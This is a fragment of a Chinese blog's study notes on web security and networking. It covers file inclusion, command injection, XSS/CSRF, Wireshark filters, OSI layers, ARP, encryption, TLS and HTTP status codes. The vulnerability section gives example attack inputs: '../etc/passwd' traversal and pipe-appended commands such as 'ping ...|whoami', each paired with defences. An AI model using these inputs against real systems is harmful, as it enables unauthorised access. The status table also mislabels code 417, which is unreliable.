title="文件包含漏洞"></a>文件包含漏洞</h2><p><strong>漏洞成因</strong><br>和SQL注入等攻击方式一样，文件包含漏洞也是一种注入型漏洞，其本质就是输入一段用户能够控制的脚本或者代码，并让服务端执行。</p><p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含。</p><p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p><p>以PHP为例,常用的文件包含函数有以下四种<br>include(),require(),include_once(),require_once()</p><p>区别如下:</p><p><strong>require():找不到被包含的文件会产生致命错误，并停止脚本运行</strong><br><strong>include():找不到被包含的文件只会产生警告，脚本继续执行</strong><br><strong>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong><br><strong>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</strong></p><p><strong>攻击方式/类型</strong><br>分为 <strong>本地文件包含漏洞</strong> 与 <strong>远程文件包含漏洞</strong><br><strong>本地文件包含</strong>的话 可以利用绝对路径来获取账号信息 又或者读取服务器文件<br>在传参中加入若干个../与etc/passwd来看账号信息</p><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为<strong>远程文件包含</strong><br>这样的话可以下载远程网站的脚本 联合csrf攻击 或者执行远程代码</p><p><strong>如何防御</strong><br>本地：<strong>输入验证和过滤</strong> 限制用户访问范围 使用白名单机制限制允许包含的文件或目录列表 只允许应用程序包含受信任的文件<br>远程：关闭<code>allow_url_include</code>、<code>allow_url_fopen</code>等配置</p><h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><strong>漏洞成因</strong></p><blockquote><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令，命令执行漏洞属于高危漏洞之一<br>如PHP的命令执行漏洞主要是基于一些函数的参数过滤不足导致，可以执行命令的函数有system( )、exec( )、shell_exec( )、passthru( )、pcntl_execl( )、popen( )、proc_open( )等，当攻击者可以控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常命令中，从而造成命令执行攻击<br>PHP执行命令是继承WebServer用户的权限，这个用户一般都有权限向Web目录写文件，可见该漏洞的危害性相当大</p></blockquote><p>假使有一个ping ip的网站 而输入框没有屏蔽; || | &amp;&amp; &amp;等管道符 导致了恶意代码的运行 这就是命令执行漏洞</p><p><strong>攻击方式/类型</strong></p><pre class="line-numbers language-none"><code class="language-none">管道符的区别WINDOWS系统支持的管道符“|”：直接执行后面的语句例如：ping www.baidu.com|whoami“||”：如果前面执行的语句执行出错，则执行后面的语句例如：ping www.baidu.com||whoami“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假例如：ping www.baidu.com&amp;whoami或者ping www.baidu.com&amp;whoami“&amp;&amp;”：如果前面的语句为真先执行第一个命令后执行第二个命令；为假则直接出错，也不执行后面的语句例如：ping www.baidu.com&amp;&amp;whoamLINUX系统支持的管道符“；”执行完前面的命令执行后面的“|”：显示后面语句的执行结果“||”：当前面的语句执行出错时，执行后面的语句“&amp;”：如果前面的语句为假，则直接指向后面的语句，前面的语句可真可假“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般与linux命令 <strong>find</strong> 一同执行<br>find 目录(一般为/ 根目录) -name(限制条件为名称) ‘flag.txt’<br><strong>如何防御</strong><br>过滤管道符 使用白名单机制对输入内容进行限制</p><h2 id="XSS-CSRF漏洞"><a href="#XSS-CSRF漏洞" class="headerlink" title="XSS&amp;CSRF漏洞"></a>XSS&amp;CSRF漏洞</h2><p><strong>漏洞成因</strong><br>XSS：未对输入框中的内容进行严格过滤 导致恶意用户能够在网页中注入恶意的脚本代码 这些恶意脚本在被其他用户访问时会在其浏览器中执行 从而达到攻击的目的<br>CSRF：应用程序没有对用户的请求进行有效的验证和授权，攻击者可以伪装用户身份向应用程序发送恶意请求，利用用户在应用程序中的登录状态或会话。</p><h3 id="攻击类型-方式："><a href="#攻击类型-方式：" class="headerlink" title="攻击类型/方式："></a><strong>攻击类型/方式：</strong></h3><p>XSS漏洞</p><ol><li><strong>存储型 XSS</strong>：攻击者将恶意脚本存储到服务器上的数据库或文件中，当其他用户访问包含恶意脚本的页面时，恶意脚本被从服务器检索并执行。</li><li><strong>反射型 XSS</strong>：攻击者将恶意脚本作为参数包含在URL中，当用户点击包含恶意参数的链接时，恶意脚本会从URL中反射到用户的浏览器中执行。</li></ol><p>CSRF漏洞</p><ol><li><strong>基于表单的CSRF</strong>：攻击者诱使用户在已经登录的情况下访问包含恶意表单的页面，当用户提交表单时，实际上是提交了恶意请求。</li><li><strong>基于图片的CSRF</strong>：攻击者将恶意请求隐藏在图片URL中，当用户加载包含恶意图片的页面时，实际上是触发了恶意请求。</li><li><strong>基于链接的CSRF</strong>：攻击者诱使用户点击包含恶意请求的链接，以触发恶意操作。</li></ol><p><strong>防御方式</strong><br>XSS：输入验证/转义 使用安全的http标头<br>CSRF：验证用户来源 生成随机验证token</p><h1 id="三、网络相关"><a href="#三、网络相关" class="headerlink" title="三、网络相关"></a>三、网络相关</h1><p><strong>Wireshark是一款用于监听网络的软件</strong></p><ul><li><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/05/05/%E5%8D%8F%E8%AE%AE-%E6%BC%8F%E6%B4%9E-%E7%BD%91%E7%BB%9C/16.png" alt="16"></p></li></ul><h3 id="1-协议过滤器"><a href="#1-协议过滤器" class="headerlink" title="1. 协议过滤器"></a>1. 协议过滤器</h3><ul><li><strong>过滤特定协议</strong>：<ul><li><code>http</code>：显示所有HTTP协议的数据包。</li><li><code>tcp</code>：显示所有TCP协议的数据包。</li><li><code>udp</code>：显示所有UDP协议的数据包。</li><li><code>icmp</code>：显示所有ICMP协议的数据包。</li></ul></li></ul><h3 id="2-IP地址和端口过滤器"><a href="#2-IP地址和端口过滤器" class="headerlink" title="2. IP地址和端口过滤器"></a>2. IP地址和端口过滤器</h3><ul><li><strong>过滤源或目标IP地址</strong>：<ul><li><code>ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100的数据包。</li></ul></li><li><strong>过滤源或目标端口</strong>：<ul><li><code>tcp.port == 80</code>：显示目标或源端口为80的TCP数据包。</li><li><code>udp.port == 53</code>：显示目标或源端口为53的UDP数据包。</li></ul></li></ul><h3 id="3-数据包方向和流量类型过滤器"><a href="#3-数据包方向和流量类型过滤器" class="headerlink" title="3. 数据包方向和流量类型过滤器"></a>3. 数据包方向和流量类型过滤器</h3><ul><li><strong>过滤数据包方向</strong>：<ul><li><code>src host 192.168.1.100</code>：显示源IP地址为192.168.1.100的数据包。</li><li><code>dst host 192.168.1.100</code>：显示目标IP地址为192.168.1.100的数据包。</li><li><code>src net 192.168.1.0/24</code>：显示源IP地址属于192.168.1.0/24子网的数据包。</li></ul></li><li><strong>过滤流量类型</strong>：<ul><li><code>tcp.flags.syn == 1</code>：显示带有TCP SYN标志的数据包（用于TCP连接建立）。</li><li><code>tcp.flags.ack == 1</code>：显示带有TCP ACK标志的数据包（用于确认）。</li></ul></li></ul><h3 id="4-组合过滤器"><a href="#4-组合过滤器" class="headerlink" title="4. 组合过滤器"></a>4. 组合过滤器</h3><ul><li><strong>组合多个条件</strong>：<ul><li><code>ip.addr == 192.168.1.100 &amp;&amp; tcp.port == 80</code>：显示源或目标IP地址为192.168.1.100且目标或源端口为80的数据包。</li><li><code>tcp.flags.syn == 1 &amp;&amp; ip.addr == 192.168.1.100</code>：显示源或目标IP地址为192.168.1.100且带有TCP SYN标志的数据包。</li></ul></li></ul><h3 id="5-其他过滤器"><a href="#5-其他过滤器" class="headerlink" title="5. 其他过滤器"></a>5. 其他过滤器</h3><ul><li><strong>过滤特定协议的字段</strong>：<ul><li><code>http.request.method == "GET"</code>：显示所有HTTP GET请求的数据包。</li><li><code>http.response.code == 200</code>：显示所有HTTP响应码为200的数据包。</li></ul></li></ul></body></html>]]></content>
    
    
    <summary type="html">&lt;p&gt;从头到尾再来一遍的感觉吧&lt;/p&gt;</summary>
    
    
    
    <category term="学习" scheme="https://www.maonie.top/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="学习" scheme="https://www.maonie.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>最新的知识点</title>
    <link href="https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
    <id>https://www.maonie.top/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/</id>
    <published>2024-04-28T02:48:04.000Z</published>
    <updated>2024-05-06T04:55:03.174Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><html><head></head><body><p>考试可能会用到 谁又知道呢</p><h1 id="一、osi模型"><a href="#一、osi模型" class="headerlink" title="一、osi模型"></a>一、osi模型</h1><p>维基百科定义：</p><blockquote><p> “OSI模型，即开放式通信系统互联参考模型（Open System Interconnection Reference Model），是国际标准化组织（ISO）提出的一个试图使各种计算机在世界范围内互连为网络的标准框架，简称OSI。”</p></blockquote><p>定义了网络互连的七层模型（物理层、数据链路层、网络层、传输层、会话层、表示层、应用层）</p><span id="more"></span><h2 id="这七层分别有什么用-对应什么协议"><a href="#这七层分别有什么用-对应什么协议" class="headerlink" title="这七层分别有什么用/对应什么协议"></a><strong>这七层分别有什么用/对应什么协议</strong></h2><p>应用层：为应用程序或用户请求提供各种请求服务。OSI参考模型最高层，也是最靠近用户的一层，为计算机用户、各种应用程序以及网络提供接口，也为用户直接提供各种网络服务。</p><p>表示层：数据编码、格式转换、数据加密。提供各种用于应用层数据的编码和转换功能,确保一个系统的应用层发送的数据能被另一个系统的应用层识别。如果必要，该层可提供一种标准表示形式，用于将计算机内部的多种数据格式转换成通信中采用的标准表示形式。数据压缩和加密也是表示层可提供的转换功能之一。</p><p>会话层：创建、管理和维护会话。接收来自传输层的数据，负责建立、管理和终止表示层实体之间的通信会话，支持它们之间的数据交换。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。</p><p>传输层：数据通信。建立主机端到端的链接，为会话层和网络层提供端到端可靠的和透明的数据传输服务，确保数据能完整的传输到网络层。</p><p>网络层：IP选址及路由选择。通过路由选择算法，为报文或通信子网选择最适当的路径。控制数据链路层与传输层之间的信息转发，建立、维持和终止网络的连接。数据链路层的数据在这一层被转换为数据包，然后通过路径选择、分段组合、顺序、进/出路由等控制，将信息从一个网络设备传送到另一个网络设备。</p><p>数据链路层：提供介质访问和链路管理。接收来自物理层的位流形式的数据，封装成帧，传送到网络层；将网络层的数据帧，拆装为位流形式的数据转发到物理层；负责建立和管理节点间的链路，通过各种控制协议，将有差错的物理信道变为无差错的、能可靠传输数据帧的数据链路。</p><p>物理层：管理通信设备和网络媒体之间的互联互通。传输介质为数据链路层提供物理连接，实现比特流的透明传输。实现相邻计算机节点之间比特流的透明传送，屏蔽具体传输介质和物理设备的差异。</p><p><img data-src="/blob.jpg" alt="blob"></p><h1 id="二、wireshark（主要是面板和筛选器）"><a href="#二、wireshark（主要是面板和筛选器）" class="headerlink" title="二、wireshark（主要是面板和筛选器）"></a>二、wireshark（主要是面板和筛选器）</h1><h2 id="首先讲面板"><a href="#首先讲面板" class="headerlink" title="首先讲面板"></a>首先讲面板</h2><p>wireshark有三个面板：</p><ul><li>packet list面板</li><li>packet details面板</li><li>packet bytes面板</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/12.png" alt="12"></p><p>这三个面板之间是相互关联的：</p><p>如果希望在packet details面板中查看一个单独的数据包的具体内容，必须在packet list面板中单机选中那个数据包<br>选中该数据包之后，才可以通过在packet deatils面板中选择数据宝的某个字段进行分析，从而在packet bytes面板中查看相应字段的字节信息</p><h2 id="packet-list"><a href="#packet-list" class="headerlink" title="packet list"></a>packet list</h2><p>packet list面板：以表格的形式显示了当前捕获文件中的所有数据报，从下面可以看出，一共有7列：</p><p>No（Number列）：包的编号<br>    默认wireshark是按照数据包编号从低到高排序<br>    该编号不会发生改变，即使使用了过滤也同样如此<br>Time列：包的时间戳。时间格式可以自己设置<br>Source列和Destination列：包的源地址和目的地址<br>Protocol列：包的协议类型<br>Length列：包的长度<br>Info列：包的附加信息</p><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/13.png" alt="13"></p><h2 id="packet-details"><a href="#packet-details" class="headerlink" title="packet details"></a>packet details</h2><p>packet details面板：分层的显示了一个数据包中的内容，并且可以通过展开或者收缩来显示这个数据包中所捕获的全部内容<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/14.png" alt="14"><br>默认数据详细信息都是合并的，如果要查看，可以单击每行前面的箭头：<br><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/15.png" alt="15"></p><h2 id="packet-bytes"><a href="#packet-bytes" class="headerlink" title="packet bytes"></a>packet bytes</h2><p>packet bytes面板：</p><ul><li>显示了一个数据包未经处理的原始样子，也就是它在链路上传播时的样子。</li><li>在该面板中的数据是以16进制和ASCII格式显示了帧的内容</li><li>当在packet details面板中选择任意一个字段后，在packet bytes面板中包含该字段的字节也高亮显示。</li></ul><p><img data-src="/2024/04/28/%E6%9C%80%E6%96%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/16.png" alt="16"></p><h1 id="三、ARP协议"><a href="#三、ARP协议" class="headerlink" title="三、ARP协议"></a>三、ARP协议</h1><h3 id="什么是ARP"><a href="#什么是ARP" class="headerlink" title="什么是ARP"></a><strong>什么是ARP</strong></h3><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存；</p><p>最直白的说法是：在IP以太网中，当一个上层协议要发包时，有了该节点的IP地址，ARP就能提供该节点的MAC地址。</p><p>大家都知道，OSI模式把网络工作分为七层，彼此不直接打交道，只通过接口(layre interface). IP地址在第三层（网络层）, MAC地址在第二层（数据链路层）。协议在发送数据包时，首先要封装第三层（IP地址）和第二层 （MAC地址）的报头, 但协议只知道目的节点的IP地址，不知道其物理地址，又不能跨第二、三层，所以得用ARP的服务拿到MAC地址。</p><h1 id="四、哈希函数"><a href="#四、哈希函数" class="headerlink" title="四、哈希函数"></a>四、哈希函数</h1><p>哈希函数（Hash Function）是一种将任意长度的数据映射到固定长度输出的算法。哈希函数常用于加密、数字签名、数据完整性验证、数据压缩等领域。</p><p>哈希函数具有以下几个特点：</p><ol><li><strong>固定输出长度</strong>：哈希函数的输出长度固定，不论输入数据的长度如何，输出长度都是固定的。</li><li><strong>单向性</strong>：哈希函数是一种单向函数，即无法从哈希值推算出原始数据。<em>这是哈希函数应用于密码学的一个关键特性。</em></li><li><strong>确定性</strong>：对于相同的输入数据，哈希函数总是会生成相同的输出值。</li><li><strong>雪崩效应</strong>：哈希函数的输入数据只要发生了微小的变化，输出值就会发生巨大的变化，这种效应被称为雪崩效应。</li></ol><p>哈希函数广泛应用于密码学中，通常用于保护数据的机密性和完整性。例如，常用的密码存储方法是将用户密码经过哈希函数处理后存储在数据库中，当用户登录时，输入的密码会被哈希函数处理后与数据库中的哈希值进行比较，从而验证密码的正确性。</p><h1 id="五、对称-非对称数据加密"><a href="#五、对称-非对称数据加密" class="headerlink" title="五、对称/非对称数据加密"></a>五、对称/非对称数据加密</h1><h2 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h2><p>概念：加密算法是公开的，靠的是秘钥来加密数据，使用一个秘钥加密，必须使用相同的秘钥才解密。<br>优点： 算法公开、计算量小、加密速度快、加密效率高<br>缺点：在数据传送前，发送方和接收方必须商定好秘钥，然后使双方都能保存好秘钥。</p><p>常见算法：DES、3DES、Blowfish、IDEA、RC4、RC5、RC6 和 AES</p><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><p>概念：加密和解密使用不同的秘钥，一把公开的公钥，一把私有的私钥。公钥加密的信息只有私钥才能解密，私钥加密的信息只有公钥才能解密。<br>优点：安全，即使密文被拦截、公钥被获取，但是无法获取到私钥，也就无法破译密文。作为接收方，务必要保管好自己的密钥。<br>缺点：加密算法及其复杂，安全性依赖算法与密钥，而且加密和解密效率很低。</p><p>常见算法：RSA、DSA、ECC<br>工作流程：A生成一对非对称秘钥，将公钥向所有人公开，B拿到A的公钥后使用A的公钥对信息加密后发送给A，经过加密的信息只有A手中的私钥能解密。这样B可以通过这种方式将自己的公钥加密后发送给A，两方建立起通信，可以通过对方的公钥加密要发送的信息，接收方用私钥解密信息。</p><h1 id="六、SSL-TLS协议（443端口-传输层）"><a href="#六、SSL-TLS协议（443端口-传输层）" class="headerlink" title="六、SSL/TLS协议（443端口 传输层）"></a>六、SSL/TLS协议（443端口 传输层）</h1><p>SSL（安全套接字层）及其后继者TLS（传输层安全）是用于在联网计算机之间建立经过身份验证和加密的链接的协议。尽管SSL协议在 1999年已经随着TLS 1.0的发布而被弃用，但我们仍将这些相关技术称为“SSL”或“SSL/TLS”。那么SSL协议的定义是什么呢？本文将为你详细介绍，并解答关于SSL和TLS的一些常见问题。</p><p><strong>一、SSL协议是什么？</strong></p><p>SSL（Secure Sockets Layer）协议是一种用于保证网络通信安全的加密协议，最新的版本为TLS（Transport Layer Security）。SSL/TLS协议<strong>工作在传输层</strong>，用于加密数据的传输，可以保证数据在传输过程中不被窃取、篡改或者伪造，是现代互联网应用程序中最广泛使用的一种安全协议。</p><p><strong>二、什么是</strong> <strong>SSL 证书？</strong></p><p><a href="https://link.zhihu.com/?target=https://www.racent.com/ssl">SSL 证书</a>，也称为 TLS 或 SSL/TLS 证书，是将网站的身份绑定到由公钥和私钥组成的加密密钥对的数字文档。证书中包含的公钥允许 Web浏览器通过TLS和HTTPS协议启动与Web服务器的加密通信会话。私钥在服务器上保持安全，用于对网页和其他文档进行数字签名。</p><p><strong>三、什么是</strong> <strong>TLS？</strong></p><p>TLS（传输层安全）于1999年发布，是用于身份验证和加密的SSL（安全套接字层）协议的继承者。TLS 1.3 在RFC 8446（2018 年 8 月）中定义。</p><p><strong>四、建议在哪个端口上使用</strong> <strong>SSL/TLS？</strong></p><p>SSL/TLS可以使用任何端口，但是为了获得最大的兼容性，更推荐标准的端口443用于安全 SSL/TLS 通信。</p><p><strong>五、当前版本的</strong> <strong>SSL/TLS 是什么？</strong></p><p>当前版本的SSL/TLS包括：TLS 1.3由RFC 8446于2018年8月定义，是 SSL/TLS 的最新版本；TLS 1.2 (RFC 5246)于2008年8月定义，并且仍在广泛使用。TLS 1.2 之前的 SSL/TLS 版本被认为是不安全的，不应再使用。</p><h1 id="七、状态码"><a href="#七、状态码" class="headerlink" title="七、状态码"></a>七、状态码</h1><h1 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h1><p>当浏览者访问一个网页时，浏览者的浏览器会向网页所在服务器发出请求。当浏览器接收并显示网页前，此网页所在的服务器会返回一个包含 HTTP 状态码的信息头（server header）用以响应浏览器的请求。</p><p>HTTP 状态码的英文为 <strong>HTTP Status Code</strong>。</p><p>下面是常见的 HTTP 状态码：</p><ul><li><strong>1xx（信息性状态码）</strong>：表示接收的请求正在处理。</li><li><strong>2xx（成功状态码）</strong>：表示请求正常处理完毕。</li><li><strong>3xx（重定向状态码）</strong>：需要后续操作才能完成这一请求。</li><li><strong>4xx（客户端错误状态码）</strong>：表示请求包含语法错误或无法完成。</li><li><strong>5xx（服务器错误状态码）</strong>：服务器在处理请求的过程中发生了错误。</li></ul><h2 id="HTTP-状态码分类"><a href="#HTTP-状态码分类" class="headerlink" title="HTTP 状态码分类"></a>HTTP 状态码分类</h2><p>HTTP 状态码由三个十进制数字组成，第一个十进制数字定义了状态码的类型。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)：</p><table><thead><tr><th align="left">分类</th><th align="left">分类描述</th></tr></thead><tbody><tr><td align="left">1**</td><td align="left">信息，服务器收到请求，需要请求者继续执行操作</td></tr><tr><td align="left">2**</td><td align="left">成功，操作被成功接收并处理</td></tr><tr><td align="left">3**</td><td align="left">重定向，需要进一步的操作以完成请求</td></tr><tr><td align="left">4**</td><td align="left">客户端错误，请求包含语法错误或无法完成请求</td></tr><tr><td align="left">5**</td><td align="left">服务器错误，服务器在处理请求的过程中发生了错误</td></tr></tbody></table><p>HTTP状态码列表:</p><table><thead><tr><th align="left">状态码</th><th align="left">状态码英文名称</th><th align="center">中文描述</th></tr></thead><tbody><tr><td align="left">100</td><td align="left">Continue</td><td align="center">继续。客户端应继续其请求</td></tr><tr><td align="left">101</td><td align="left">Switching Protocols</td><td align="center">切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">200</td><td align="left">OK</td><td align="center">请求成功。一般用于GET与POST请求</td></tr><tr><td align="left">201</td><td align="left">Created</td><td align="center">已创建。成功请求并创建了新的资源</td></tr><tr><td align="left">202</td><td align="left">Accepted</td><td align="center">已接受。已经接受请求，但未处理完成</td></tr><tr><td align="left">203</td><td align="left">Non-Authoritative Information</td><td align="center">非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本</td></tr><tr><td align="left">204</td><td align="left">No Content</td><td align="center">无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</td></tr><tr><td align="left">205</td><td align="left">Reset Content</td><td align="center">重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</td></tr><tr><td align="left">206</td><td align="left">Partial Content</td><td align="center">部分内容。服务器成功处理了部分GET请求</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">300</td><td align="left">Multiple Choices</td><td align="center">多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择</td></tr><tr><td align="left">301</td><td align="left">Moved Permanently</td><td align="center">永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替</td></tr><tr><td align="left">302</td><td align="left">Found</td><td align="center">临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI</td></tr><tr><td align="left">303</td><td align="left">See Other</td><td align="center">查看其它地址。与301类似。使用GET和POST请求查看</td></tr><tr><td align="left">304</td><td align="left">Not Modified</td><td align="center">未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</td></tr><tr><td align="left">305</td><td align="left">Use Proxy</td><td align="center">使用代理。所请求的资源必须通过代理访问</td></tr><tr><td align="left">306</td><td align="left">Unused</td><td align="center">已经被废弃的HTTP状态码</td></tr><tr><td align="left">307</td><td align="left">Temporary Redirect</td><td align="center">临时重定向。与302类似。使用GET请求重定向</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">400</td><td align="left">Bad Request</td><td align="center">客户端请求的语法错误，服务器无法理解</td></tr><tr><td align="left">401</td><td align="left">Unauthorized</td><td align="center">请求要求用户的身份认证</td></tr><tr><td align="left">402</td><td align="left">Payment Required</td><td align="center">保留，将来使用</td></tr><tr><td align="left">403</td><td align="left">Forbidden</td><td align="center">服务器理解请求客户端的请求，但是拒绝执行此请求</td></tr><tr><td align="left">404</td><td align="left">Not Found</td><td align="center">服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面</td></tr><tr><td align="left">405</td><td align="left">Method Not Allowed</td><td align="center">客户端请求中的方法被禁止</td></tr><tr><td align="left">406</td><td align="left">Not Acceptable</td><td align="center">服务器无法根据客户端请求的内容特性完成请求</td></tr><tr><td align="left">407</td><td align="left">Proxy Authentication Required</td><td align="center">请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权</td></tr><tr><td align="left">408</td><td align="left">Request Time-out</td><td align="center">服务器等待客户端发送的请求时间过长，超时</td></tr><tr><td align="left">409</td><td align="left">Conflict</td><td align="center">服务器完成客户端的 PUT 请求时可能返回此代码，服务器处理请求时发生了冲突</td></tr><tr><td align="left">410</td><td align="left">Gone</td><td align="center">客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置</td></tr><tr><td align="left">411</td><td align="left">Length Required</td><td align="center">服务器无法处理客户端发送的不带Content-Length的请求信息</td></tr><tr><td align="left">412</td><td align="left">Precondition Failed</td><td align="center">客户端请求信息的先决条件错误</td></tr><tr><td align="left">413</td><td align="left">Request Entity Too Large</td><td align="center">由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息</td></tr><tr><td align="left">414</td><td align="left">Request-URI Too Large</td><td align="center">请求的URI过长（URI通常为网址），服务器无法处理</td></tr><tr><td align="left">415</td><td align="left">Unsupported Media Type</td><td align="center">服务器无法处理请求附带的媒体格式</td></tr><tr><td align="left">416</td><td align="left">Requested range not satisfiable</td><td align="center">客户端请求的范围无效</td></tr><tr><td align="left">417</td><td align="left">I’m a teapot</td><td align="center">服务器无法满足Expect的请求头信息</td></tr><tr><td align="left">418</td><td align="left">I’m a teapot</td><td align="center">状态码 418 实际上是一个愚人节玩笑。它在 RFC 2324 中定义，该 RFC 是一个关于超文本咖啡壶控制协议（HTCPCP）的笑话文件。在这个笑话中，418 状态码是作为一个玩笑加入到 HTTP 协议中的。</td></tr><tr><td align="left"></td><td align="left"></td><td align="center"></td></tr><tr><td align="left">500</td><td align="left">Internal Server Error</td><td align="center">服务器内部错误，无法完成请求</td></tr><tr><td align="left">501</td><td align="left">Not Implemented</td><td align="center">服务器不支持请求的功能，无法完成请求</td></tr><tr><td align="left">502</td><td align="left">Bad Gateway</td><td align="center">作为网关或者代理工作的服务器尝试执行请求时，从远程服务器接收到了一个无效的响应</td></tr><tr><td align="left">503</td><td align="left">Service Unavailable</td><td align="center">由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中</td></tr><tr><td align="left">504</td><td align="left">Gateway Time-out</td><td 